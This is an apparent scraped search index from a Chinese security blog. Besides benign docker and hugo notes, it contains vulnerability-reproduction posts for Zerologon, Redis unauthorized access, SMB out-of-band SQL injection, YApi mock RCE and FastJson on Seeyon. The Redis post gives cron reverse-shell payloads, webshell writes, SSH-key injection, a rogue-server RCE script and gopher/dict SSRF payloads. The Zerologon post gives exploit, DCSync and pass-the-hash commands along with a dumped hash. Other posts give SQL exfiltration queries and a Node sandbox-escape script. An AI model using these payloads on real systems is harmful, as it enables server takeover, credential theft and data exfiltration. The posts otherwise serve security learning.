6.重启动docker\nsystemctl restart docker  7.开机自启docker命令\nsystemctl enable docker\r 8.重启系统检查服务是否正在运行\nps -aux | grep docker\r 9.检查服务是否开机启动\nsystemctl is-enabled docker.service  如果docker开机未自启，按照以下命令重新设置开启自启\n1.将服务配置成开机启动\nsystemctl enable docker.service  2.启动服务\nsystemctl start docker.service  Docker更换国内镜像源\n修改/etc/docker/daemon.json配置文件\ncat \u0026lt;\u0026lt; 'EOF' \u0026gt; /etc/docker/daemon.json\r{\r\u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://registry.docker-cn.com\u0026quot;,\u0026quot;http://hub-mirror.c.163.com\u0026quot; ],\r\u0026quot;exec-opts\u0026quot;: [\u0026quot;native.cgroupdriver=systemd\u0026quot;],\r\u0026quot;log-driver\u0026quot;: \u0026quot;json-file\u0026quot;,\r\u0026quot;log-opts\u0026quot;: {\r\u0026quot;max-size\u0026quot;: \u0026quot;50m\u0026quot;\r},\r\u0026quot;storage-driver\u0026quot;: \u0026quot;overlay2\u0026quot;,\r\u0026quot;storage-opts\u0026quot;: [\r\u0026quot;overlay2.override_kernel_check=true\u0026quot;\r]\r}\rEOF\r 容器开机启动： 创建容器时候指定restart参数：\ndocker run -it -p 6379:6379 --restart=always --name redis -d redis\r docker自启\ndocker run -d --name phpmyadmin -p 80:80 --restart=always 44924:latest\r 对已经创建的容器用docker update 更新:\ndocker update --restart=always xxx\r--restart具体参数值详细信息 :\rno - 容器退出时，不重启容器\ron-failure - 只有在非0状态退出时才从新启动容器\ralways - 无论退出状态是如何，都重启容器\r 安装docker-compose （1）首先访问 docker-compose 的 GitHub 版本发布页面：\n https://github.com/docker/compose/releases  （2）由于服务器是 CentOS 系统，则下载 Linux 版本的 Compose：\n（3）将下载下来的“docker-compose-Linux-x86_64”文件上传到服务器上，然后执行如下命令将其移动到 /usr/local/bin，并改名为“docker-compose”。\nmv docker-compose-Linux-x86_64 /usr/local/bin/docker-compose\r （4）接着执行如下命令添加可执行权限：\nchmod +x /usr/local/bin/docker-compose\r （5）最后使用 docker-compose -v 命令测试是否安装成功（如果提示“没有那个文件或目录”可以重启下服务器再试试）：\nkail安装好docker之后 构建容器可能会报错，使用以下命令解决该问题\nsudo mkdir /sys/fs/cgroup/systemd\rsudo mount -t cgroup -o none,name=systemd cgroup /sys/fs/cgroup/systemd\r ","id":20,"section":"posts","summary":"1.下载docker-19.03.8.tgz wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.8.tgz 2.解压 docker-19.03.8.tgz tar -xvf docker-19.03.8.tgz 复制 sudo cp docker/* /usr/bin/ 4.复制一下内容到 vim /etc/systemd/system/docker.service [Unit] Description=Docker Application Container Engine Documentation=https://docs.docker.com After=network-online.target firewalld.service Wants=network-online.target [Service] Type=notify # the default is not to use systemd for cgroups","tags":["软件安装"],"title":"离线安装docker","uri":"https://ad-calcium.github.io/2021/07/%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85docker/","year":"2021"},{"content":"漏洞介绍 2020年08月12日，Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分\r攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序\r 影响版本 Windows Server 2008 R2 for x64-based Systems Service Pack 1\rWindows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)\rWindows Server 2012\rWindows Server 2012 (Server Core installation)\rWindows Server 2012 R2\rWindows Server 2012 R2 (Server Core installation)\rWindows Server 2016\rWindows Server 2016 (Server Core installation)\rWindows Server 2019\rWindows Server 2019 (Server Core installation)\rWindows Server, version 1903 (Server Core installation)\rWindows Server, version 1909 (Server Core installation)\rWindows Server, version 2004 (Server Core installation)\r 复现环境 版本: Windows Server 2012\rIP: 10.99.99.253\rBlosname: OWA2013 (域控的主机名)\r 漏洞工具 impacket https://github.com/SecureAuthCorp/impacket\r重置域内管理员密码poc https://github.com/dirkjanm/CVE-2020-1472\r恢复密码poc https://github.com/risksense/zerologon\r 漏洞复现 福漏洞开始使用exp重置管理员密钥\npython3 cve-2020-1472-exploit.py OWA2013 10.99.99.253\r 通过 Dcsync获取域内所有有用户hash\npython3 secretsdump.py rootkit/OWA2013\\$@10.99.99.253 -just-dc -no-pass\r 得到了域控的 Hash:\nrootkit.org\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c:::\r 通过 wmic hash 传递获取shell：\npython3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c rootkit.org/Administrator@10.99.99.253\r 通过导出 sam system 等文件到本地，获取域控机器上本地保存之前的 hash 值用于恢复，不然就脱域了：\n备份注册表\n导出注册表文件\rreg save HKLM\\SYSTEM system.save\rreg save HKLM\\SAM sam.save\rreg save HKLM\\SECURITY security.save\r将文件下载到本地\rget system.save\rget sam.save\rget security.save\r删除文件\rdel /f system.save\rdel /f sam.save\rdel /f security.save\r 之后你会发现再你的当前机器会生成几个文件：sam.save、security.save、system.save\n之后通过 sam.save、security.save、system.save 这些文件获得原来域控机器上的 Ntlm Hash 值，用于恢复密码：\npython3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL\r 通过拿到 $MACHINE.ACC: 的值，然后进行恢复(注意只有后半部分)\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7e304360db8cdb95d09a960607fcc526\r 恢复密码\npython3 reinstall_original_pw.py OWA2013 10.99.99.253 7e304360db8cdb95d09a960607fcc526\r 验证是否恢复密码成功\npython3 secretsdump.py rootkit/OWA2013\\$@10.99.99.253 -just-dc -no-pass\r ","id":21,"section":"posts","summary":"漏洞介绍 2020年08月12日，Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏","tags":["漏洞复现","内网"],"title":"NetLogon 域内提权漏洞（CVE-2020-1472）","uri":"https://ad-calcium.github.io/2021/07/netlogon-%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2020-1472/","year":"2021"},{"content":"Redis介绍 Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库。\n###安装教程\n第1步：Redis下载\rwget http://download.redis.io/releases/redis-3.2.11.tar.gz\r第2步：Redis解压、编译\rtar zxvf redis-3.2.11.tar.gz\rcd redis-3.2.11\rmake #编译失败也可以的，不影响\rmake install\r进入 redis.conf 文件，还原漏洞现场，修改配置文件\r vim redis.conf 新版中这里是127.0.0.1，将他注释掉或者改为0.0.0.0\n将保护模式改为no\n完成之后启动服务\nredis-server redis.conf 启动服务\rredis-cli shutdown 关闭服务\r 关闭防火墙命令： service iptables stop 永久关闭防火墙：chkconfig iptables off\n永久有效：修改/etc/sysconfig/selinux 将SELINUX=enforcing，改为SELINUX=disabled。然后重启 即时有效：setenforce 0\n在kali下安装redis-cli\nwget http://download.redis.io/releases/redis-2.8.12.tar.gz 下载\rtar -xzf redis-2.8.12.tar.gz # 解压\rcd redis-2.8.12 #cd进入redis目录\rmake #make安装\r进入src目录\rcd src\r./redis-cli -h 如果这个命令出现帮助界面说明可以正常使用\r连接靶机\r./redis-cli -h 192.168.62.137 -p 6379\r 尝试输入命令info，可以成功执行\n查看所有秘钥（我这表示为空，没有秘钥）\nkeys *\r 攻击利用 写入文件 设置路径，把shell写入到网站根目录下（/var/www/html/）\rCONFIG SET dir /var/www/html/\r修改备份文件名\rCONFIG SET dbfilename 1.php\r写入内容\rSET webshell \u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot;\rsave\r 查看是否写入成功\n反弹shell 在kali里开启监听\nnc -lvvp 9999\nset shell \u0026quot;\\n\\n*/1 * * * * /bin/bash -i\u0026gt;\u0026amp;/dev/tcp/192.168.239143/9999 0\u0026gt;\u0026amp;1\\n\\n\u0026quot;\rconfig set dir /var/spool/cron\rconfig set dbfilename root\rsave\r 等待一分钟，kali已经成功接收shell\n通过写入SSH公钥实现SSH登录 原理就是在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生一个授权的key。\n在kali生成ssh公钥 (一路回车即可) ssh-keygen -t rsa\n查看id_rsa.pub\ncat /root/.ssh/id_rsa.pub\r 执行redis命令\nconfig set dir /root/.ssh/\rconfig set dbfilename authorized_keys\rset x \u0026quot;\\n\\n\\nssh-rsa 这里填id_rsa.pub的内容 root@kali\\n\\n\\n\u0026quot;\rsave\r清空数据库\rFLUSHALL\r Redis主从复制getshell 原理： 利用主从特性传输数据，通过模块加载，增加执行命令的函数。\n下载镜像 docker pull damonevking/redis5.0\n映射端口并运行容器 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server \n自动化工具 exp下载地址： redis-rce redis-rogue-server\n环境编译\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\rcd RedisModules-ExecuteCommand/\rmake\rgit clone https://github.com/Ridter/redis-rce.git\rcd redis-rce/\rcp ../RedisModules-ExecuteCommand/src/module.so ./\rpip install -r requirements.txt python redis-rce.py -r 136.244.70.243（目标ip) -L 136.244.70.243（自己的ip） -f module.so\r python3 redis-rce.py -r 136.244.70.243（目标ip) -L 136.244.70.243（自己的ip） -f exp.so\n手动 利用docker开启2台redis容器用于复现主从复制。\n下载镜像 docker pull damonevking/redis5.0\n映射端口并运行容器\ndocker run -p 6379:6379 -d damonevking/redis5.0 redis-server\rdocker run -p 6666:6379 -d --name redis-service-3 damonevking/redis5.0\r 首先进入主redis\nset webshell \u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot;\rget webshell\r 在本地 redis 设置远程服务器 redis 服务器为主服务器，同步远程服务器 redis 的内容\nslaveof 192.168.72.196 6379\rrole\rget shell\r 写shell\nconfig set dir /data/\rconfig set dbfilename 11.txt\rsave\r 关闭同步\rSLAVEOF NO ONE\r清除缓存\rflushall\r 编写脚本，构造恶意Redis服务器，监听本地端口1234，加载exp.so。 python RogueServer.py \u0026ndash;lport 1234 \u0026ndash;exp exp.so\nconfig set dir ./ #设置redis的备份路径为当前目录\rconfig set dbfilename exp.so #设置备份文件名为exp.so，默认为dump.rdb\rslaveof 192.168.172.129 1234 #设置主服务器IP和端口\rmodule load ./exp.so #加载恶意模块\rslaveof no one #切断主从，关闭复制功能\rsystem.exec 'whoami' #执行系统命令\rsystem.rev 127.0.0.1 9999 config set dbfilename dump.rdb #通过dump.rdb文件恢复数据\rsystem.exec 'rm ./exp.so' #删除exp.so\rmodule unload system #卸载system模块的加载\r 成功执行系统命令\nRedis服务端模拟脚本\nimport socket\rfrom time import sleep\rfrom optparse import OptionParser\rdef RogueServer(lport):\rresp = \u0026quot;\u0026quot;\rsock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\rsock.bind((\u0026quot;0.0.0.0\u0026quot;,lport))\rsock.listen(10)\rconn,address = sock.accept() sleep(5)\rwhile True: data = conn.recv(1024)\rif \u0026quot;PING\u0026quot; in data:\rresp=\u0026quot;+PONG\u0026quot;+CLRF\rconn.send(resp)\relif \u0026quot;REPLCONF\u0026quot; in data:\rresp=\u0026quot;+OK\u0026quot;+CLRF\rconn.send(resp)\relif \u0026quot;PSYNC\u0026quot; in data or \u0026quot;SYNC\u0026quot; in data:\rresp = \u0026quot;+FULLRESYNC \u0026quot; + \u0026quot;Z\u0026quot;*40 + \u0026quot; 1\u0026quot; + CLRF\rresp += \u0026quot;$\u0026quot; + str(len(payload)) + CLRF\rresp = resp.encode()\rresp += payload + CLRF.encode()\rif type(resp) != bytes:\rresp =resp.encode() conn.send(resp) #elif \u0026quot;exit\u0026quot; in data:\rbreak\rif __name__==\u0026quot;__main__\u0026quot;:\rparser = OptionParser() parser.add_option(\u0026quot;--lport\u0026quot;, dest=\u0026quot;lp\u0026quot;, type=\u0026quot;int\u0026quot;,help=\u0026quot;rogue server listen port, default 21000\u0026quot;, default=21000,metavar=\u0026quot;LOCAL_PORT\u0026quot;) parser.add_option(\u0026quot;-f\u0026quot;,\u0026quot;--exp\u0026quot;, dest=\u0026quot;exp\u0026quot;, type=\u0026quot;string\u0026quot;,help=\u0026quot;Redis Module to load, default exp.so\u0026quot;, default=\u0026quot;exp.so\u0026quot;,metavar=\u0026quot;EXP_FILE\u0026quot;) (options , args )= parser.parse_args()\rlport = options.lp\rexp_filename = options.exp\rCLRF=\u0026quot;\\r\\n\u0026quot;\rpayload=open(exp_filename,\u0026quot;rb\u0026quot;).read()\rprint \u0026quot;Start listing on port: %s\u0026quot; %lport\rprint \u0026quot;Load the payload: %s\u0026quot; %exp_filename RogueServer(lport)\r SSRF+Redis 反弹shell 参照Redis手动getshell的过程，可轻易实现SSRF+Redis反弹shell。\n以curl为例，漏洞代码为ssrf.php:\n\u0026lt;?php\r$ch = curl_init();\rcurl_setopt($ch, CURLOPT_URL, $_GET['url']);\r#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\rcurl_setopt($ch, CURLOPT_HEADER, 0);\r#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);\rcurl_exec($ch);\rcurl_close($ch);\r?\u0026gt;\r 环境准备： 模拟内网未授权Redis服务器：192.168.172.131 模拟攻击者机器：192.168.172.129 在攻击者机器上构建恶意Redis服务器，同时监听本地9999端口等待shell返回。\n1、利用dict协议反弹shell\n#查看当前redis的相关配置\rssrf.php?url=dict://192.168.172.131:6379/info\r#设置备份文件名\rssrf.php?url=dict://192.168.172.131:6379/config:set:dbfilename:exp.so\r#连接恶意Redis服务器\rssrf.php?url=dict://192.168.172.131:6379/slaveof:192.168.172.129:1234\r#加载恶意模块\rssrf.php?url=dict://192.168.172.131:6379/module:load:./exp.so\r#切断主从复制\rssrf.php?url=dict://192.168.172.131:6379/slaveof:no:one\r#执行系统命令\rssrf.php?url=dict://192.168.172.131:6379/system.rev:192.168.172.129:9999\r 2、利用gopher协议反弹shell\n#设置文件名，连接恶意Redis服务器\rgopher://192.168.172.131:6379/_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.172.129%25201234%250d%250aquit\r#加载exp.so，反弹shell\rgopher://192.168.172.131:6379/_module%2520load%2520./exp.so%250d%250asystem.rev%2520192.168.172.129%25209999%250d%250aquit\r 3、利用这两种协议，都可以成功获取shell。\n","id":22,"section":"posts","summary":"Redis介绍 Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库。 ###安装教程","tags":["漏洞复现","未授权"],"title":"redis未授权","uri":"https://ad-calcium.github.io/2021/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/","year":"2021"},{"content":"前言 温故而知新，今天在整理古老的近乎失传的DNS外带注入方法时，偶然间发现外带数据的装载区域并不一定是 域名前缀。放在后面也是可以的，由于目前网络上没有相关的记载，姑且称之为SMB外带注入吧。\r 1.搭建测试环境 系统:centos7\n首先安装smb服务\nyum install samba -y\r 修改配置文件: vim /etc/samba/smb.conf\n[global]\rmap to guest = Bad User\rserver role = standalone server\rusershare allow guests = yes\ridmap config * : backend = tdb\rsmb ports = 445\rlog level = 10\r[share]\rcomment = share\rpath = /tmp\rguest ok = yes\rwritable =yes\rbrowsable = yes\r#force user = smbuser\r 保存配置文件, 重启smb服务\nsystemctl restart smb.service\r 在windows环境的机器，上面安装MySQL ，建议安装 MySQL 5.7.16 以下版本，主要是由于高版本有一个默认选项secure_file_priv ，默认不允许load_file 。 如果安装的数据库版本\u0026gt;=MySQL 5.7.16 在my.ini文件中将secure_file_priv设置为空, 修改完成后, 记得重启mysql服务\nshow global variables like '%secure%';\r smb外带注入与DNS外带注入比较:\nsmb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。\rsmb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。\r 构造sql语句：\nselect load_file(concat(\u0026quot;\\\\\\\\\u0026lt;IP\u0026gt;\\\\\u0026quot;,(SQL语句),\u0026quot;\\\\xxx\u0026quot;))\r为了方便从log里提取查询的内容，可以构造如下语句\rselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\share[\u0026quot;,database(),\u0026quot;]\\\\1.txt\u0026quot;));\r 我们在MySQL服务器上执行这样一条SQL语句：\nselect load_file('\\\\\\\\10.99.99.234\\\\share\\\\1.txt');\r在samba服务器上查看到了这样一条日志：\r[2021/07/03 03:27:45.437996, 10, pid=9939, effective(0, 0), real(0, 0)] ../../source3/lib/util_event.c:54(smbd_idle_event_handler)\r 获取当前数据库名\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\share[\u0026quot;,database(),\u0026quot;]\\\\1.txt\u0026quot;));\r 查看smb日志\n tail -f /var/log/samba/log.smbd | grep \u0026quot;failed to find service\u0026quot;\r 查询当前数据库里的表\n1. 使用limit\r2. substring截断\r 使用limit请先获取总共的表数\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\test[\u0026quot;,(select count(table_name) from information_schema.tables where table_schema=database()),\u0026quot;]\\\\1.txt\u0026quot;));\r 再用limit逐个查询\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\test[\u0026quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),\u0026quot;]\\\\1.txt\u0026quot;));\r 验证第test库中的第一个表名是否为aggregate_graph_templates substring截断 截断到120字符串即可\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\test[\u0026quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),\u0026quot;]\\\\1.txt\u0026quot;));\r 另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破 NTLM-relay攻击参考: https://www.cnblogs.com/car7n/p/14887818.html\nselect load_file('\\\\\\\\10.99.99.245\\\\x');\r kali运行responder\nresponder -I eth0 -f 10.99.99.41\r用法: -I表示指定的网卡，-f表示允许攻击者查看受害者的主机指纹。\r 参考地址: https://422926799.github.io/posts/af61cc76.html http://moonslow.com/article/smb_sql_injection\n","id":23,"section":"posts","summary":"前言 温故而知新，今天在整理古老的近乎失传的DNS外带注入方法时，偶然间发现外带数据的装载区域并不一定是 域名前缀。放在后面也是可以的，由于目前","tags":["小技巧","web安全"],"title":"SMB外带注入","uri":"https://ad-calcium.github.io/2021/07/smb%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5/","year":"2021"},{"content":"0x01 漏洞介绍 Yapi 由 YMFE开源，旨在为开发、产品、测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布、维护API。\n安全人员在Yapi官方Github仓库提交了漏洞issues，地址为:https://github.com/YMFE/yapi/issues/2233。\n0x02 漏洞描述 YAPI接口管理平台是国内某旅行网站的大前端技术中心开源项目，使用mock数据/脚本作为中间交互层，为前端后台开发与测试人员提供更优雅的接口管理服务，该系统被国内较多知名互联网企业所采用。\nYApi 是高效、易用、功能强大的 api 管理平台。但因为大量用户使用 YAPI的默认配置并允许从外部网络访问 YApi服务，导致攻击者注册用户后，即可通过 Mock功能远程执行任意代\n0x03 FOFA语句 app=\u0026quot;YApi\u0026quot;\ricon_hash=\u0026quot;-715193973\u0026quot;\r 0x03 Yapi部署教程 使用Docker构建Yapi(Ubuntu环境)。\n启动mongodb。\ndocker run -d --name mongo-yapi -p 27017:27017 mongo\r 获取 Yapi 镜像，版本信息可在 阿里云镜像仓库查看\ndocker pull registry.cn-hangzhou.aliyuncs.com/anoy/yapi\r 自定义配置文件挂载到目录/api/config.json，宿主机/config/config.json 内容为以下代码：\n{\r\u0026quot;port\u0026quot;: \u0026quot;3000\u0026quot;,\r\u0026quot;adminAccount\u0026quot;: \u0026quot;admin@qq.com\u0026quot;,\r\u0026quot;db\u0026quot;: {\r\u0026quot;servername\u0026quot;: \u0026quot;mongo-yapi\u0026quot;,\r\u0026quot;DATABASE\u0026quot;: \u0026quot;yapi\u0026quot;,\r\u0026quot;port\u0026quot;: 27017\r},\r\u0026quot;mail\u0026quot;: {\r\u0026quot;enable\u0026quot;: true,//邮件通知\r\u0026quot;host\u0026quot;: \u0026quot;smtp.qq.com\u0026quot;,//邮箱服务器\r\u0026quot;port\u0026quot;: 465,\r\u0026quot;from\u0026quot;: \u0026quot;admin@qq.com\u0026quot;,//发件人邮箱\r\u0026quot;auth\u0026quot;: {\r\u0026quot;user\u0026quot;: \u0026quot;adminadmin@qq.com\u0026quot;,//邮箱服务器账号\r\u0026quot;pass\u0026quot;: \u0026quot;123456\u0026quot;//邮箱服务器密码\r}\r}\r}\r 初始化Yapi数据库索引及管理员账号。\n\rdocker run -it --rm \\\r-v /config/config.json:/api/config.json \\\r--link mongo-yapi:mongo \\\r--entrypoint npm \\\r--workdir /api/vendors \\\rregistry.cn-hangzhou.aliyuncs.com/anoy/yapi \\\rrun install-server\r 启动Yapi服务。\n\rdocker run -d \\\r-v /config/config.json:/api/config.json \\\r--name yapi \\\r--link mongo-yapi:mongo \\\r--workdir /api/vendors \\\r-p 3000:3000 \\\rregistry.cn-hangzhou.aliyuncs.com/anoy/yapi \\\rserver/app.js\r 访问http://localhost:3000登录账号admin@qq.com，密码 123456。\n漏洞利用 注册用户 利用前提为Yapi开启了注册功能，打开靶机地址，注册一个账号。\n添加项目 添加一个项目。 输入项目名称，输入完成后点击创建名称 添加接口 点击添加接口 输入接口名称和接口路径，输入完成后点击提交 添加Mock脚本 点击高级Mock，并打开脚本页面 开启脚本，输入Mock脚本\n脚本内容:\nconst sandbox = this\rconst ObjectConstructor = this.constructor\rconst FunctionConstructor = ObjectConstructor.constructor\rconst myfun = FunctionConstructor('return process')\rconst process = myfun()\rmockJson = process.mainModule.require(\u0026quot;child_process\u0026quot;).execSync(\u0026quot;whoami\u0026quot;).toString()\r 点击保存，打开预览界面。访问Mock地址即可执行命令。 访问Mock地址 成功获取当前用户\n可将Mock脚本中的whoami改成任意语句，可执行反弹shell等操作。\n修复建议 该漏洞暂无补丁。\n临时修复建议：\n  关闭YAPI用户注册功能，以阻断攻击者注册。\n  利用请求白名单的方式限制 YAPI 相关端口。\n  排查 YAPI 服务器是否存在恶意访问记录。\n  切勿非法用途，履行白帽职责。\n批量脚本：https://raw.githubusercontent.com/ad-calcium/vuln_script/main/Yapi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.py\n","id":24,"section":"posts","summary":"0x01 漏洞介绍 Yapi 由 YMFE开源，旨在为开发、产品、测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布、维护API。 安全人员在Yapi","tags":["漏洞复现","web安全"],"title":"Yapi远程命令执行漏洞","uri":"https://ad-calcium.github.io/2021/07/yapi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"0x01 影响范围 V7.1、V7.1SP1\nV7.0、V7.0SP1、V7.0SP2、V7.0SP3\nV6.1、V6.1SP1、V6.1SP2\nV6.0、V6.0SP1\nV5.6、V5.6SP1\n0x02 漏洞搜索 搜索语法\nFOFA：\u0026quot;seeyon\u0026quot; \u0026amp;\u0026amp; after=\u0026quot;2021-05-01\u0026quot;\r 0x03 漏洞检测 Jndi影响范围：\n1、rmi的利用方式：适用jdk版本：JDK 6u132、JDK 7u122、JDK 8u113之前\n2、ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前\n区分FastJson与Jackson：\n1）不闭合花括号看报错信息方法\n2）减少参数方法\n{\u0026ldquo;name\u0026rdquo;:\u0026ldquo;S\u0026rdquo;, \u0026ldquo;age\u0026rdquo;:21}//Fastjson 是不会报错\n{\u0026ldquo;name\u0026rdquo;:\u0026ldquo;S\u0026rdquo;, \u0026ldquo;age\u0026rdquo;:21,\u0026ldquo;xxx\u0026rdquo;:123}// Jackson 语法相对比较严格,会报错\n3）fastjson报错关键词:\ncom.alibaba.fastjson.JSONException , 触发方式如下\n{\u0026ldquo;x\u0026rdquo;:\u0026quot;\n[\u0026ldquo;x\u0026rdquo;:1]\n{\u0026ldquo;x\u0026rdquo;:{\u0026quot;@type\u0026quot;:\u0026ldquo;java.lang.AutoCloseable\u0026rdquo;\nDNS探测方法：\n注意：Content-Type: application/json\n# 未报错poc\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.net.InetSocketAddress\u0026quot;{\u0026quot;address\u0026quot;:,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}}}\r{\u0026quot;x\u0026quot;:{{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}:\u0026quot;x\u0026quot;}}\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;com.alibaba.fastjson.JSONObject\u0026quot;, {\u0026quot;@type\u0026quot;: \u0026quot;java.net.URL\u0026quot;, \u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}}\u0026quot;\u0026quot;}}\r# 报错,但仍有效\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet4Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}}\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet6Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}}\r{\u0026quot;x\u0026quot;:Set[{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}]}\r# 报错,且返回400,但仍有效\r{\u0026quot;x\u0026quot;:Set[{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}}\r{\u0026quot;x\u0026quot;:{{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}:0}\r 0x04 漏洞复现 1.使用dnslog验证漏洞, 打开http://www.dnslog.cn获取域名\n漏洞POC\nPOST /seeyon/main.do?method=changeLocale HTTP/1.1\rHost: xxxxx\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 71\r_json_params={\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet4Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;qn94mq.dnslog.cn\u0026quot;}\r 3.将上面的代码放到BurpSuite中，然后设置好对应的HOST和端口。\n查看dnslog 成功回显, 说明存在漏洞\n","id":25,"section":"posts","summary":"0x01 影响范围 V7.1、V7.1SP1 V7.0、V7.0SP1、V7.0SP2、V7.0SP3 V6.1、V6.1SP1、V6.1SP2 V6.0、","tags":["漏洞复现"],"title":"致远伪0day-FastJson利用链","uri":"https://ad-calcium.github.io/2021/07/%E8%87%B4%E8%BF%9C%E4%BC%AA0day-fastjson%E5%88%A9%E7%94%A8%E9%93%BE/","year":"2021"},{"content":"1、hugo hugo是基于命令行的静态网站生成工具，使用go语言开发。因此，下载编译好的二进制文件，就可以直接运行，无需安装其它依赖。将hugo添加到环境变量，更便于使用。\nhugo源码地址：hugo github\n常用命令列表 通过hugo help命令可以获取hugo命令行的帮助文档。\nhugo new site 创建一个新的网站(骨架), 例如: hugo new site myblog，他会在当前目录下创建一个myblog的文件夹，并在其中填充必须的必须的目录和文件。\n下面是myblog文件夹的结构：\n├─archetypes\r├─content\r├─data\r├─layouts\r├─resources\r│ └─_gen\r│ ├─assets\r│ └─images\r├─static\r└─themes\r└─study-theme\r├─archetypes\r├─layouts\r│ ├─partials\r│ └─_default\r└─static\r├─css\r└─js\r hugo new 添加网站内容. 例如: hugo new about.md，他会在content目录下生成一个about.md的文件，根据这个文件可以生成对应的静态页面。可以在about.md前面添加对应的路径，但文件会以content为根目录，也就是说所有添加新文件都会存放在content目录下面。\nhugo new theme 为网站添加UI，也就是模板文件/主题文件。例如: hugo new theme mytheme。这会在themes目录下创建一个mytheme目录，mytheme目录中会默认添加一些基本的文件结构。所有的模板/主题文件都会保存在themes目录中。\nhugo hugo本身就是一个命令，他的作用就是生成静态网站，默认在生成的静态文件保存在public目录中，也可以指定路径。\nhugo server hugo自带一个web服务器，运行hugo server后可以通过 http://localhost:1313 来访问静态网站。\n下面是hugo server常用的参数, 注意大小写:\n-p 端口: 修改默认端口\n-D: 在使用server预览网站时，draft属性为ture的草稿文件是不会生成预览的，添加-D后可以预览草稿文件。\n2、hugo theme hugo theme的下载地址：hugo themes\n我这里选择用的是[hugo-theme-pure]https://github.com/xiaoheiAh/hugo-theme-pure\n用这个的原因是：界面比较简洁、有文章归档、有关键词搜索（这个我很需要）\n3、使用hugo Page Bundles 文档地址：Page Bundles\nPage Bundles 